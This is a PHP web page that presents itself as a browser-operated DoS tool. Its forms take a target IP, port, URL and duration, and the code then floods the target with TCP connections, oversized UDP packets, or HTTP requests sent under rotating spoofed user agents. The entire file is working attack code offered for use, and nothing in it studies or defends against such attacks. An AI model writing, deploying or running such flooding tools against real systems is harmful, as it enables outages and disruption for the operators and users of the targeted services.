<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mr.BDKR28's Web-Based DoS Tool</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: Arial, sans-serif;
        }
        input, select {
            background-color: #333;
            color: red;
            border: 1px solid red;
        }
        h3 {
            color: red;
        }
        label {
            color: red;
        }
        .button {
            color: red;
            background-color: #444;
            border: 1px solid red;
        }
    </style>
</head>
<body>

<?php
session_start();

if (isset($_POST['ddos_stop'])) {
    $_SESSION['ddos_running'] = false;
    echo "<div style='color: red;'>DDoS attack stopped.</div>";
}

if (isset($_POST['http_ddos_stop'])) {
    $_SESSION['http_ddos_running'] = false;
    echo "<div style='color: red;'>HTTP DDoS attack stopped.</div>";
}

if (isset($_POST['ddos_start']) && !isset($_SESSION['ddos_running'])) {
    $_SESSION['ddos_running'] = true;
    $target_ip = $_POST['target_ip'];
    $target_port = $_POST['target_port'];
    $protocol = $_POST['protocol'];
    $duration = $_POST['duration'];

    if ($protocol == 'TCP') {
        $end_time = time() + $duration;
        echo "<div style='color: lightgreen;'>Starting TCP DDoS attack on $target_ip:$target_port for $duration seconds...</div>";
        while (time() < $end_time && $_SESSION['ddos_running']) {
            for ($i = 0; $i < 5000; $i++) {
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if ($sock !== false) {
                    @socket_connect($sock, $target_ip, $target_port);
                    $data = str_repeat('A', 8192);
                    @socket_send($sock, $data, strlen($data), 0);
                    socket_close($sock);
                }
            }
            usleep(100);
        }
    } elseif ($protocol == 'UDP') {
        $end_time = time() + $duration;
        echo "<div style='color: lightgreen;'>Starting UDP DDoS attack on $target_ip:$target_port for $duration seconds...</div>";
        $packet = str_repeat("XxXxXxXxX", 65507);
        while (time() < $end_time && $_SESSION['ddos_running']) {
            $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            if ($sock !== false) {
                @socket_sendto($sock, $packet, strlen($packet), 0, $target_ip, $target_port);
                socket_close($sock);
            }
            usleep(1000);
        }
    }
}

if (isset($_POST['http_ddos_start']) && !isset($_SESSION['http_ddos_running'])) {
    $_SESSION['http_ddos_running'] = true;
    $http_target = $_POST['http_target'];
    $http_method = $_POST['http_method'];
    $http_duration = $_POST['http_duration'];

    $user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Linux; Ubuntu; X11; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    ];

    echo "<div style='color: red;'>Starting HTTP DDoS attack on $http_target using $http_method for $http_duration seconds...</div>";
    $end_time = time() + $http_duration;
    while (time() < $end_time && $_SESSION['http_ddos_running']) {
        $user_agent = $user_agents[array_rand($user_agents)];
        for ($i = 0; $i < 500; $i++) {
            $fp = fsockopen(parse_url($http_target, PHP_URL_HOST), 80);
            if ($fp) {
                $out = "$http_method / HTTP/1.1\r\n";
                $out .= "Host: $http_target\r\n";
                $out .= "User-Agent: $user_agent\r\n";
                $out .= "Connection: Close\r\n\r\n";
                fwrite($fp, $out);
                fclose($fp);
            }
            usleep(100);
        }
    }
}
?>

<div style='border: 1px solid red; padding: 10px; margin-top: 20px;'>
    <h3>DDoS Attack Configuration</h3>
    <form method='POST'>
        <label for='target_ip'>Target IP:</label>
        <input type='text' name='target_ip' required /><br>
        <label for='target_port'>Target Port:</label>
        <input type='number' name='target_port' required /><br>
        <label for='protocol'>Protocol:</label>
        <select name='protocol'>
            <option value='TCP'>TCP</option>
            <option value='UDP'>UDP</option>
        </select><br>
        <label for='duration'>Duration (seconds):</label>
        <input type='number' name='duration' required /><br>
        <input type='submit' name='ddos_start' value='Start DDoS' class='button' />
        <input type='submit' name='ddos_stop' value='Stop DDoS' class='button' />
    </form>

    <h3>HTTP DDoS Attack Configuration</h3>
    <form method='POST'>
        <label for='http_target'>HTTP Target URL:</label>
        <input type='text' name='http_target' required /><br>
        <label for='http_method'>HTTP Method:</label>
        <select name='http_method'>
            <option value='GET'>GET</option>
            <option value='POST'>POST</option>
        </select><br>
        <label for='http_duration'>Duration (seconds):</label>
        <input type='number' name='http_duration' required /><br>
        <input type='submit' name='http_ddos_start' value='Start HTTP DDoS' class='button' />
        <input type='submit' name='http_ddos_stop' value='Stop HTTP DDoS' class='button' />
    </form>
</div>

</body>
</html>